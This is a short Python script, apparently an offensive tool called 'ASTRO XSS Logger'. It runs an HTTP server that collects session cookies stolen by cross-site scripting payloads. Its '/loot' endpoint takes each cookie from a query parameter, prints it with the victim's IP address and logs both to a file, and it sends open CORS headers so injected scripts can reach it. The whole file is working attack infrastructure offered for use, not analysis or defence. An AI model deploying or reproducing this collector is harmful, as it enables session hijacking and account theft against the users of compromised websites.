from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class LootHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.path == '/loot':
            params = urllib.parse.parse_qs(parsed_path.query)
            cookie = params.get('c', ['No Cookie'])[0]
            print(f"
[!] XSS LOOT RECEIVED [!]")
            print(f"Cookie: {cookie}")
            print(f"Client: {self.client_address[0]}")
            with open("xss_loot.log", "a") as f:
                f.write(f"Source: {self.client_address[0]} | Cookie: {cookie}
")
        
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"OK")

def run(port=1337):
    server_address = ('', port)
    httpd = HTTPServer(server_address, LootHandler)
    print(f"[*] ASTRO XSS Logger active on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
